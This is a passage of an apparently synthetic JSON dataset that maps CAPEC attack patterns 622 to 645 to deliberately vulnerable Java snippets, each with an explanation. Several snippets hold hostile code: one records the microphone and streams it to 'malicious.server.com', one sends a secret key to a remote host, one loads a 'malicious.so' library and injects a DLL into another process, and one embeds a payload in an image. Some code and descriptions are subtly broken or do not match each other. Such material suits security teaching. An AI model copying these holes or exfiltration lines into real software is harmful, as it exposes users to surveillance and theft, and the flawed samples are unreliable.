        "code_snippet": "public class SecureMessageSender {\n    private static final int FIXED_DELAY = 100;\n    \n    public void sendSecureMessage(String message, String recipient) {\n        try {\n            // Attempt to encrypt message\n            String encryptedMsg = encrypt(message);\n            \n            // Deliberately add timing variation based on message content\n            if(message.contains(\"SECRET\")) {\n                Thread.sleep(FIXED_DELAY * 2);\n            } else {\n                Thread.sleep(FIXED_DELAY);\n            }\n            \n            // Send message with metadata that reveals timing patterns\n            NetworkConnection conn = new NetworkConnection(recipient);\n            long startTime = System.currentTimeMillis();\n            conn.send(encryptedMsg);\n            long endTime = System.currentTimeMillis();\n            \n            // Log transmission metadata including timing\n            Logger.log(\"Message sent to: \" + recipient);\n            Logger.log(\"Transmission time: \" + (endTime - startTime) + \"ms\");\n            Logger.log(\"Message size: \" + encryptedMsg.length());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private String encrypt(String message) {\n        // Basic encryption implementation\n        return Base64.getEncoder().encodeToString(message.getBytes());\n    }\n}",
        "description": "This code demonstrates vulnerable message transmission that leaks information through timing channels and metadata. While the message content is encrypted, the code introduces observable timing variations based on message content and logs sensitive metadata about the transmission. An attacker monitoring the network traffic could analyze the timing patterns and message sizes to infer information about the message content, even without breaking the encryption."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "public class CryptographicProcessor {\n    private static final String SECRET_KEY = \"MySecretKey123\";\n    \n    public void processEncryption(String data) {\n        // Using a weak encryption algorithm susceptible to side-channel attacks\n        try {\n            Thread.sleep(data.length() * 10); // Timing variations based on input\n            \n            for(char c : data.toCharArray()) {\n                int result = c ^ SECRET_KEY.charAt(0);\n                // Power-consuming operation that varies with data\n                for(int i = 0; i < result; i++) {\n                    Math.pow(2, i);\n                }\n            }\n            \n            // Sending sensitive data over unprotected channel\n            Socket socket = new Socket(\"remote-server.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(SECRET_KEY + \"|\" + data);\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerability to electromagnetic side-channel attacks through multiple weaknesses: it performs power-intensive operations that vary with the data being processed, introduces timing variations based on input length, uses a weak XOR-based encryption, and transmits sensitive data (including the secret key) over an unprotected channel. The computational patterns create distinct electromagnetic emissions that could be monitored to extract the secret key and processed data."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "public class SensitiveDeviceOperations {\n    private static final int PIN_LENGTH = 4;\n    private int[] secretPIN = {1, 2, 3, 4};\n    \n    public boolean verifyPIN(int[] inputPIN) {\n        boolean isValid = true;\n        \n        // Vulnerable PIN verification with timing side-channel\n        for(int i = 0; i < PIN_LENGTH; i++) {\n            if(inputPIN[i] != secretPIN[i]) {\n                isValid = false;\n                // Continue checking to avoid timing attacks\n                Thread.sleep(50); // Consistent delay for each digit\n            }\n        }\n        \n        if(isValid) {\n            // Emit success signal with sensitive data\n            System.out.println(\"PIN verified: \" + Arrays.toString(secretPIN));\n            // Perform sensitive operation with observable power consumption\n            for(int i = 0; i < 1000000; i++) {\n                Math.pow(secretPIN[i % 4], 2);\n            }\n        }\n        \n        return isValid;\n    }\n}",
        "description": "This code demonstrates multiple physical side-channel vulnerabilities: it leaks timing information during PIN verification, emits sensitive data in output messages, performs power-consuming operations correlated with secret values, and includes predictable execution patterns that could be observed through electromagnetic emissions. The code is susceptible to timing analysis, power analysis, and electromagnetic emanation monitoring attacks."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "public class CryptoDevice {\n    private static final int VOLTAGE_THRESHOLD = 3300; // 3.3V nominal\n    private static final int TEMP_THRESHOLD_HIGH = 85; // degrees C\n    private static final int TEMP_THRESHOLD_LOW = 0;\n    private byte[] secretKey;\n    \n    public byte[] performCryptoOperation(byte[] data) {\n        // No voltage or temperature checks before critical operation\n        int currentVoltage = readVoltage();\n        int currentTemp = readTemperature();\n        \n        byte[] result = new byte[data.length];\n        for(int i = 0; i < data.length; i++) {\n            // Vulnerable to timing attacks and glitch attacks\n            result[i] = (byte)(data[i] ^ secretKey[i % secretKey.length]);\n        }\n        return result;\n    }\n    \n    private int readVoltage() {\n        // Simulated voltage reading with no error checking\n        return VOLTAGE_THRESHOLD;\n    }\n    \n    private int readTemperature() {\n        // Simulated temperature reading with no protection\n        return TEMP_THRESHOLD_HIGH / 2;\n    }\n}",
        "description": "This code represents a vulnerable cryptographic device implementation that lacks proper protection against physical tampering. It fails to implement proper voltage and temperature monitoring, making it susceptible to fault injection attacks. The code performs cryptographic operations without verifying the integrity of the operating environment, making it vulnerable to voltage glitches, temperature manipulation, and electromagnetic interference. The lack of proper sensor checks and error handling allows for potential exploitation through hardware manipulation."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "public class CryptoOperation {\n    private static final byte[] secretKey = \"sensitive_key_123\".getBytes();\n    \n    public byte[] performEncryption(byte[] data) {\n        // No voltage or temperature monitoring\n        // No clock glitch detection\n        // Direct access to hardware features without protection\n        try {\n            for(int i = 0; i < data.length; i++) {\n                // Vulnerable to timing attacks and fault injection\n                data[i] ^= secretKey[i % secretKey.length];\n                Thread.sleep(1); // Predictable timing\n            }\n            return data;\n        } catch(Exception e) {\n            // Dangerous error handling that could leak key information\n            System.err.println(\"Error during encryption: \" + e.toString() + \n                             \" with key: \" + new String(secretKey));\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerabilities to fault injection attacks by implementing cryptographic operations without hardware security protections. It lacks voltage monitoring, clock glitch detection, and temperature sensors. The code directly exposes sensitive key material and has predictable timing behavior that makes it susceptible to side-channel attacks. Error handling can leak secret key information, and there are no safeguards against instruction skipping or electromagnetic interference."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "public class PINAuthenticator {\n    private static final int PIN_LENGTH = 4;\n    private String correctPin = \"1234\";\n    private int[][] touchCoordinates = {\n        {100, 200}, // 1\n        {200, 200}, // 2\n        {300, 200}, // 3\n        {100, 300}  // 4\n    };\n\n    public boolean authenticate(String enteredPin) {\n        // Store touch coordinates in memory without clearing\n        for (int i = 0; i < enteredPin.length(); i++) {\n            int digit = Character.getNumericValue(enteredPin.charAt(i));\n            storeCoordinate(touchCoordinates[digit - 1][0], touchCoordinates[digit - 1][1]);\n        }\n        return enteredPin.equals(correctPin);\n    }\n\n    private void storeCoordinate(int x, int y) {\n        // Coordinates stored in memory without encryption or clearing\n        byte[] coords = (x + \",\" + y).getBytes();\n        // Memory not cleared after use\n    }\n}",
        "description": "This code represents a vulnerable PIN authentication system that stores touch coordinates in memory without proper cleanup, making it susceptible to physical side-channel attacks through touch pattern analysis. The code stores raw touch coordinates without encryption or clearing memory, potentially allowing attackers to recover PIN patterns through oil smudge analysis or memory inspection."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "public class GPSReceiver {\n    private double latitude;\n    private double longitude;\n    private long timestamp;\n\n    public void processGPSSignal(byte[] signal) {\n        // No verification of signal source or integrity\n        if(signal.length >= 16) {\n            // Directly process raw GPS data without authentication\n            latitude = ByteBuffer.wrap(signal, 0, 8).getDouble();\n            longitude = ByteBuffer.wrap(signal, 8, 8).getDouble();\n            timestamp = System.currentTimeMillis();\n            updateLocation(latitude, longitude);\n        }\n    }\n\n    public void updateLocation(double lat, double lon) {\n        // Blindly trust and use the received coordinates\n        this.latitude = lat;\n        this.longitude = lon;\n        navigationSystem.setCurrentPosition(lat, lon);\n    }\n\n    public Location getCurrentLocation() {\n        return new Location(latitude, longitude, timestamp);\n    }\n}",
        "description": "This vulnerable code demonstrates a GPS receiver implementation that lacks proper signal source verification and authentication. It processes incoming GPS signals without validating their authenticity or integrity, making it susceptible to GPS spoofing attacks. The code directly accepts and processes raw GPS data without implementing any cryptographic verification or signal validation mechanisms, allowing an attacker to inject false coordinates through counterfeit GPS signals."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "public class GPSNavigationSystem {\n    private double latitude;\n    private double longitude;\n    private double altitude;\n    private boolean isConnected = false;\n\n    public void receiveGPSSignal(String signal, double signalStrength) {\n        // No verification of signal source or integrity\n        if(signalStrength > 0) {\n            isConnected = true;\n            try {\n                String[] coordinates = signal.split(\",\");\n                latitude = Double.parseDouble(coordinates[0]);\n                longitude = Double.parseDouble(coordinates[1]);\n                altitude = Double.parseDouble(coordinates[2]);\n                updateLocation(latitude, longitude, altitude);\n            } catch (Exception e) {\n                // Silent failure, no logging of potential attack\n            }\n        }\n    }\n\n    private void updateLocation(double lat, double lon, double alt) {\n        // Blindly trust and update coordinates without validation\n        this.latitude = lat;\n        this.longitude = lon;\n        this.altitude = alt;\n        navigateToCoordinates();\n    }\n\n    private void navigateToCoordinates() {\n        // No checks for sudden position changes or signal authenticity\n        if(isConnected) {\n            setNavigationRoute(latitude, longitude);\n        }\n    }\n\n    private void setNavigationRoute(double lat, double lon) {\n        // Vulnerable navigation implementation\n    }\n}",
        "description": "This vulnerable GPS navigation system implementation accepts and processes GPS signals without proper authentication or validation. It fails to verify the source of incoming signals, doesn't check for signal integrity, and doesn't detect gradual position manipulation characteristic of GPS spoofing attacks. The code blindly trusts incoming coordinates and lacks mechanisms to detect sudden position changes or verify signal authenticity, making it susceptible to carry-off attacks where an attacker can gradually manipulate the perceived location."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "public class ResourceManager {\n    private FileInputStream fileStream;\n    private PowerManager powerManager;\n    private boolean isAdmin = false;\n\n    public void processUserInput(String userPath) {\n        try {\n            // Missing resource release (CWE-772)\n            fileStream = new FileInputStream(userPath);\n            byte[] buffer = new byte[1024];\n            fileStream.read(buffer);\n            \n            // No power consumption checks (CWE-920)\n            while(true) {\n                heavyComputation();\n            }\n        } catch(Exception e) {\n            // Improper handling of device names (CWE-67)\n            if(userPath.equalsIgnoreCase(\"CON\") || \n               userPath.equalsIgnoreCase(\"AUX\")) {\n                System.out.println(\"Processing special device: \" + userPath);\n            }\n        }\n    }\n\n    public void authenticateUser(String token) {\n        // Incorrect authorization (CWE-863)\n        if(token != null) {\n            isAdmin = true;\n        }\n    }\n\n    private void heavyComputation() {\n        // Resource-intensive operation without power checks\n        for(int i = 0; i < 1000000; i++) {\n            Math.pow(i, 2);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues including resource leaks, uncontrolled power consumption, improper device name handling, and weak authorization checks. The code fails to release FileInputStream, performs unlimited power-consuming operations, incorrectly handles Windows device names, and implements a flawed authentication mechanism."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "public class URLRedirector {\n    public void redirectUser(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String redirectUrl = request.getParameter(\"redirectUrl\");\n        \n        // Vulnerable comparison that can be bypassed with similar-looking domains\n        if(redirectUrl.toLowerCase().contains(\"trusted-domain.com\")) {\n            response.sendRedirect(redirectUrl);\n        } else {\n            // Basic domain validation that can be bypassed\n            String sanitizedUrl = redirectUrl.replace(\" \", \"\").trim();\n            if(sanitizedUrl.endsWith(\".com\")) {\n                // Vulnerable - does not properly validate the domain\n                response.sendRedirect(sanitizedUrl);\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable URL redirection implementation that is susceptible to typosquatting attacks. It performs insufficient validation of redirect URLs, allowing attackers to redirect users to malicious domains that look similar to legitimate ones. The code contains weak domain validation logic and improper string comparison that can be bypassed using similar-looking domain names."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "public class DomainValidator {\n    public static boolean isValidDomain(String userDomain) {\n        try {\n            // Insecure: relies only on reverse DNS lookup\n            InetAddress addr = InetAddress.getByName(userDomain);\n            String hostname = addr.getCanonicalHostName();\n            \n            // Vulnerable comparison using simple string matching\n            if (hostname.toLowerCase().contains(\"trusteddomain\")) {\n                return true;\n            }\n            \n            // Redirect user based on domain validation\n            if (isHomophoneDomain(userDomain)) {\n                String redirectUrl = \"https://\" + userDomain + \"/login\";\n                response.sendRedirect(redirectUrl);\n                return true;\n            }\n        } catch (Exception e) {\n            return false;\n        }\n        return false;\n    }\n    \n    private static boolean isHomophoneDomain(String domain) {\n        // Vulnerable: only checks basic string similarity\n        return domain.replaceAll(\"[0-9]\", \"\").equalsIgnoreCase(\"trusteddomain\");\n    }\n}",
        "description": "This code demonstrates a vulnerable domain validation system that is susceptible to homophone-based domain squatting attacks. It relies on unsafe reverse DNS lookup, performs weak domain name comparisons, and includes an open redirect vulnerability. The code fails to properly validate domain authenticity and can be fooled by similarly-sounding domain names."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "public class DomainValidator {\n    private static final String DOMAIN_REGEX = \"[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}\";  // Missing anchors\n\n    public boolean isValidDomain(String domain) {\n        // No homoglyph detection\n        return domain.matches(DOMAIN_REGEX);\n    }\n\n    public String fetchDomainContent(String userProvidedDomain) {\n        try {\n            // No proper validation of homoglyphs or encoding\n            URL url = new URL(\"https://\" + userProvidedDomain);\n            URLConnection conn = url.openConnection();\n            \n            // Vulnerable to SSRF\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(conn.getInputStream()));\n            \n            StringBuilder content = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                content.append(line);\n            }\n            reader.close();\n            return content.toString();\n        } catch (Exception e) {\n            return \"Error fetching domain content\";\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a domain validator that fails to properly check for homoglyphs in domain names and lacks proper input validation. It uses an unanchored regex pattern, doesn't check for Unicode homoglyphs, and is vulnerable to SSRF attacks through unchecked domain fetching. The code could allow attackers to register and use visually similar domain names for phishing attacks."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "public class TokenGenerator {\n    private static final String SECRET_KEY = \"hardcoded_secret_123\";\n    \n    public static String generateToken(String username) {\n        // Weak token generation without proper validation\n        return Base64.getEncoder().encodeToString(\n            (username + \"_\" + System.currentTimeMillis()).getBytes()\n        );\n    }\n    \n    public static boolean validateToken(String token) {\n        try {\n            // Insufficient token validation\n            String decodedToken = new String(Base64.getDecoder().decode(token));\n            return decodedToken.contains(\"_\");\n        } catch(Exception e) {\n            return false;\n        }\n    }\n    \n    public static void impersonateUser(String token) {\n        if(validateToken(token)) {\n            // Dangerous impersonation without proper authentication\n            String username = new String(Base64.getDecoder().decode(token)).split(\"_\")[0];\n            System.setProperty(\"current.user\", username);\n            executePrivilegedOperation();\n        }\n    }\n    \n    private static void executePrivilegedOperation() {\n        String currentUser = System.getProperty(\"current.user\");\n        // Privileged operation executed with impersonated identity\n    }\n}",
        "description": "This vulnerable code demonstrates weak token generation and validation, allowing for identity impersonation. The token generation is based on simple string concatenation and base64 encoding without proper cryptographic protection. The validation is insufficient, and the impersonation mechanism allows elevation of privileges without proper authentication checks. The code uses a hardcoded secret and lacks proper security controls for token assignment and verification."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "public class AudioSurveillance {\n    private AudioInputStream audioStream;\n    private String recordingPath = \"/tmp/recording.wav\";\n    private boolean isRecording = false;\n\n    public void startRecording() {\n        try {\n            AudioFormat format = new AudioFormat(44100, 16, 1, true, true);\n            DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);\n            TargetDataLine microphone = (TargetDataLine) AudioSystem.getLine(info);\n            microphone.open(format);\n            microphone.start();\n\n            audioStream = new AudioInputStream(microphone);\n            isRecording = true;\n\n            Thread recordingThread = new Thread(() -> {\n                try {\n                    AudioSystem.write(audioStream, AudioFileFormat.Type.WAVE, new File(recordingPath));\n                    Socket socket = new Socket(\"malicious.server.com\", 12345);\n                    FileInputStream fis = new FileInputStream(recordingPath);\n                    OutputStream out = socket.getOutputStream();\n                    byte[] buffer = new byte[4096];\n                    int count;\n                    while ((count = fis.read(buffer)) > 0) {\n                        out.write(buffer, 0, count);\n                    }\n                    fis.close();\n                    out.close();\n                    socket.close();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n            recordingThread.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates audio surveillance functionality that captures audio from the system's microphone without proper authorization checks. It records audio and sends it in cleartext to a remote server. The code exhibits multiple vulnerabilities: it operates without checking privileges (CWE-267), transmits sensitive data in cleartext (CWE-319), exposes physical side-channel data (CWE-1300), and potentially leaks system information through error messages (CWE-497)."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "public class FileProcessor {\n    public void processUploadedFile(String fileName) {\n        String extension = fileName.substring(fileName.lastIndexOf(\".\"));\n        if (extension.equalsIgnoreCase(\".txt\")) {\n            // Process as text file\n            processTextFile(fileName);\n        } else if (extension.equalsIgnoreCase(\".doc\")) {\n            // Process as document\n            processDocument(fileName);\n        } else if (extension.equalsIgnoreCase(\".exe\")) {\n            // Block executable files\n            return;\n        }\n        \n        File file = new File(\"C:\\\\uploads\\\\\" + fileName);\n        // Process file based on extension without proper validation\n        if (file.exists()) {\n            Runtime.getRuntime().exec(\"cmd.exe /c start \" + file.getPath());\n        }\n    }\n    \n    private void processTextFile(String fileName) { /* implementation */ }\n    private void processDocument(String fileName) { /* implementation */ }\n}",
        "description": "This code is vulnerable to file extension manipulation attacks. It relies solely on the file extension to determine how to process files, and directly uses user-supplied filenames in file system operations. An attacker could bypass the .exe check using alternate extensions or 8.3 filename format, or use special characters to manipulate the file path. The code also dangerously executes files based on their extension without proper validation."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "public class ImageMetadataExploit {\n    public static void embedMaliciousCode(String imagePath) throws Exception {\n        File imageFile = new File(imagePath);\n        String maliciousCode = \"payload.exe\";\n        \n        // Create hidden streams to embed data\n        RandomAccessFile raf = new RandomAccessFile(imageFile, \"rw\");\n        raf.seek(imageFile.length());\n        \n        // Store sensitive data in image metadata\n        byte[] sensitiveData = \"password=admin123\".getBytes();\n        raf.write(sensitiveData);\n        \n        // Embed executable in alternate data stream\n        FileInputStream maliciousExe = new FileInputStream(maliciousCode);\n        byte[] buffer = new byte[4096];\n        int bytesRead;\n        \n        while ((bytesRead = maliciousExe.read(buffer)) != -1) {\n            raf.write(buffer, 0, bytesRead);\n        }\n        \n        // Store covert channel data\n        for(int i = 0; i < 8; i++) {\n            raf.write((byte)(i % 2));\n        }\n        \n        raf.close();\n        maliciousExe.close();\n    }\n}",
        "description": "This code demonstrates embedding malicious data and sensitive information within image file metadata. It writes sensitive data in cleartext, embeds an executable payload, and implements a covert storage channel using bit patterns. The code stores this data under web root, making it potentially accessible to untrusted parties."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "public class SensitiveDataHandler {\n    private static Clipboard systemClipboard = Toolkit.getDefaultToolkit().getSystemClipboard();\n    \n    public static void processCustomerData(String creditCardNumber, String ssn) {\n        // Store sensitive data in GUI elements\n        JTextField creditCardField = new JTextField(creditCardNumber);\n        JTextField ssnField = new JTextField(ssn);\n        \n        // Copy sensitive data to clipboard\n        StringSelection selection = new StringSelection(creditCardNumber + \":\" + ssn);\n        systemClipboard.setContents(selection, null);\n        \n        // Privilege escalation - allows any application to read clipboard\n        try {\n            Thread.sleep(5000); // Keep data in clipboard for 5 seconds\n            // Data remains accessible to other applications during this time\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code snippet demonstrates vulnerable handling of sensitive data by explicitly storing credit card numbers and SSNs in both GUI elements and system clipboard. The data remains accessible to any application with clipboard access, and the GUI elements store the sensitive information in cleartext. The sleep timer keeps the sensitive data exposed in the clipboard for an extended period, increasing the risk of unauthorized access."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "public class UnsecureBootloader {\n    private static final String MBR_LOCATION = \"/dev/sda\";\n    private static final String FIRMWARE_PATH = \"/firmware/boot.bin\";\n    \n    public void initializeSystem() {\n        // Load bootloader without verification\n        byte[] bootCode = loadBootCode();\n        \n        // Direct memory access without access controls\n        long memoryAddress = 0x1000;\n        writeToMemory(memoryAddress, bootCode);\n        \n        // Execute boot code without validation\n        executeBootCode(memoryAddress);\n    }\n    \n    private void writeToMemory(long address, byte[] data) {\n        try {\n            // Unsafe direct memory access\n            sun.misc.Unsafe unsafe = getUnsafeInstance();\n            unsafe.copyMemory(data, 0L, null, address, data.length);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private byte[] loadBootCode() {\n        try {\n            // Read MBR without verification\n            FileInputStream fis = new FileInputStream(MBR_LOCATION);\n            return fis.readAllBytes();\n        } catch (Exception e) {\n            return new byte[0];\n        }\n    }\n    \n    private void executeBootCode(long address) {\n        // Execute code from memory without validation\n        try {\n            sun.misc.Unsafe unsafe = getUnsafeInstance();\n            unsafe.defineClass(null, null, address, 1024);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private sun.misc.Unsafe getUnsafeInstance() throws Exception {\n        Field f = sun.misc.Unsafe.class.getDeclaredField(\"theUnsafe\");\n        f.setAccessible(true);\n        return (sun.misc.Unsafe) f.get(null);\n    }\n}",
        "description": "This code demonstrates vulnerable bootloader implementation that allows unauthorized modification of the Master Boot Record (MBR) and execution of untrusted boot code. It lacks proper access controls for memory operations, firmware verification, and secure boot chain validation. The code directly manipulates memory using unsafe operations, loads boot code without verification, and executes code from arbitrary memory locations, making it susceptible to firmware-level attacks and malicious code execution during the boot process."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "public class FileProcessor {\n    public void processUserData(String userId) {\n        try {\n            String tempDir = System.getProperty(\"java.io.tmpdir\");\n            File tempFile = new File(tempDir + \"/user_\" + userId + \"_data.txt\");\n            \n            // Write sensitive user information to temp file\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"SSN: 123-45-6789\\n\");\n            writer.write(\"Credit Card: 4111-1111-1111-1111\\n\");\n            writer.write(\"Password Hash: abc123def456\\n\");\n            writer.close();\n            \n            // Process the data\n            processData(tempFile);\n            \n            // File is left in temp directory without proper cleanup\n            // No access controls or encryption implemented\n        } catch (Exception e) {\n            e.printStackTrace(); // Prints full stack trace with sensitive info\n        }\n    }\n    \n    private void processData(File file) {\n        // Processing logic\n    }\n}",
        "description": "This vulnerable code creates a temporary file with sensitive user information in the system's temporary directory without proper access controls, encryption, or cleanup. It also exposes sensitive information through error messages. The file remains accessible to unauthorized users and the error handling reveals system details through stack traces."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "public class DynamicCodeLoader {\n    static {\n        try {\n            System.load(\"/tmp/malicious.so\");\n        } catch(UnsatisfiedLinkError e) {}\n    }\n    \n    public static void executeUntrustedCode(String libraryPath) {\n        try {\n            ClassLoader loader = new URLClassLoader(new URL[]{new File(libraryPath).toURI().toURL()});\n            Class<?> loadedClass = loader.loadClass(\"com.malicious.PayloadExecutor\");\n            Method method = loadedClass.getDeclaredMethod(\"execute\");\n            method.setAccessible(true);\n            method.invoke(null);\n        } catch(Exception e) {}\n    }\n    \n    public static void injectIntoProcess(int pid) {\n        try {\n            Runtime.getRuntime().exec(\"inject \" + pid + \" /path/to/malicious.dll\");\n        } catch(IOException e) {}\n    }\n}",
        "description": "This code demonstrates several dangerous practices related to process control and code injection. It loads untrusted native libraries, uses a custom ClassLoader to dynamically load potentially malicious classes, and attempts to inject code into other running processes. The code deliberately lacks security checks and error handling, making it vulnerable to execution of malicious code."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "public class DLLLoader {\n    static {\n        try {\n            // Vulnerable: Using a fixed path without validation\n            String dllPath = \"C:\\\\Windows\\\\WinSxS\\\\mylib.dll\";\n            System.load(dllPath);\n        } catch (UnsatisfiedLinkError e) {\n            // Fallback to searching in system directories\n            System.loadLibrary(\"mylib\");\n        }\n    }\n    \n    public static void loadAdditionalLibrary(String libraryName) {\n        // Vulnerable: Loading library without path validation\n        String libPath = System.getProperty(\"java.library.path\") + \"\\\\\"\n                + libraryName + \".dll\";\n        System.load(libPath);\n    }\n}",
        "description": "This code demonstrates vulnerable DLL loading practices by using fixed paths and unvalidated library names. It fails to properly validate the DLL source and doesn't use manifest files to specify exact DLL characteristics, making it susceptible to DLL side-loading attacks where an attacker could place malicious DLLs in the search path."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "public class InsecureFileHandler {\n    private static final String BINARY_PATH = \"C:\\Program Files\\App\\bin\";\n    \n    public void updateBinary(String filename, byte[] newContent) {\n        try {\n            String fullPath = BINARY_PATH + \"\\\\\"+filename;\n            File binary = new File(fullPath);\n            \n            // No permission checks before writing\n            FileOutputStream fos = new FileOutputStream(binary);\n            fos.write(newContent);\n            fos.close();\n            \n            // Execute binary with elevated privileges\n            String command = fullPath + \" --update\";\n            Runtime.getRuntime().exec(command);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void extractAndRun(String zipFile) {\n        try {\n            String extractPath = System.getenv(\"TEMP\");\n            // Unzips to temp directory without checking permissions\n            ProcessBuilder pb = new ProcessBuilder(\"unzip\", zipFile, \"-d\", extractPath);\n            pb.start();\n            \n            // Execute extracted file without validation\n            Runtime.getRuntime().exec(extractPath + \"\\\\program.exe\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable file handling that allows unauthorized modification and execution of binaries. It does not validate file permissions, uses unquoted paths, accepts untrusted input for command execution, and executes files from an untrusted search path. The code allows arbitrary file writes to a binary directory and executes files without proper validation, potentially enabling malware execution with elevated privileges."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "public class FileManager {\n    private static final String SHARED_PATH = \"\\\\\\\\fileserver\\\\shared\\\\\";\n    \n    public static List<String> searchFiles(String searchPattern) {\n        List<String> results = new ArrayList<>();\n        try {\n            File sharedFolder = new File(SHARED_PATH);\n            searchRecursive(sharedFolder, searchPattern, results);\n            \n            // Expose all found files without access control\n            for (String file : results) {\n                File f = new File(file);\n                f.setReadable(true, false);\n                f.setExecutable(true, false);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return results;\n    }\n    \n    private static void searchRecursive(File directory, String pattern, List<String> results) {\n        File[] files = directory.listFiles();\n        if (files != null) {\n            for (File file : files) {\n                if (file.getName().contains(pattern)) {\n                    results.add(file.getAbsolutePath());\n                }\n                if (file.isDirectory()) {\n                    searchRecursive(file, pattern, results);\n                }\n            }\n        }\n    }\n}",
        "description": "This vulnerable code allows unrestricted access to shared network drives and exposes sensitive file information. It uses hard-coded UNC paths, performs recursive directory searches without proper access controls, and makes found files globally readable and executable. The code doesn't validate user input for path traversal attempts and exposes file system structure through unfiltered search results."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "public class WindowsAuthenticator {\n    private static final String DOMAIN = \"company.local\";\n    private static HashMap<String, String> storedHashes = new HashMap<>();\n    \n    static {\n        // Store NTLM hashes directly instead of salted passwords\n        storedHashes.put(\"admin\", \"aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\");\n    }\n    \n    public boolean authenticate(String username, String ntlmHash) {\n        String storedHash = storedHashes.get(username);\n        if (storedHash != null) {\n            // Direct hash comparison without salt or proper security measures\n            return storedHash.equalsIgnoreCase(ntlmHash);\n        }\n        return false;\n    }\n    \n    public void impersonateUser(String username) {\n        if (authenticate(username, storedHashes.get(username))) {\n            // Unsafe impersonation without proper security checks\n            System.setProperty(\"user.name\", username);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates insecure storage and comparison of NTLM hashes for Windows domain authentication. It stores password hashes directly in memory, performs direct hash comparison without proper security measures, implements single-factor authentication, and includes unsafe user impersonation. The code is susceptible to pass-the-hash attacks, replay attacks, and privilege escalation through impersonation."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "public class KerberosAuthenticator {\n    private static final String TICKET_STORE = \"/tmp/kerberos_tickets/\";\n    \n    public boolean authenticateUser(String ticketData) {\n        // Store Kerberos ticket in plaintext file\n        String ticketPath = TICKET_STORE + System.currentTimeMillis() + \".ticket\";\n        try {\n            FileWriter writer = new FileWriter(ticketPath);\n            writer.write(ticketData);\n            writer.close();\n            \n            // Validate ticket without checking expiration or replay\n            return validateTicket(ticketPath);\n        } catch (IOException e) {\n            return false;\n        }\n    }\n    \n    private boolean validateTicket(String ticketPath) {\n        try {\n            String storedTicket = new String(Files.readAllBytes(Paths.get(ticketPath)));\n            // No verification of ticket signature or origination\n            return storedTicket.contains(\"TGT=\") || storedTicket.contains(\"ST=\");\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates insecure handling of Kerberos tickets by storing them in plaintext files and performing inadequate validation. The code lacks proper ticket signature verification, expiration checking, and replay protection. It stores credentials insecurely (CWE-522), is susceptible to replay attacks (CWE-294), uses single-factor authentication (CWE-308), lacks proper entity authentication (CWE-322), and implements incorrect security identifier conversion (CWE-1292)."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
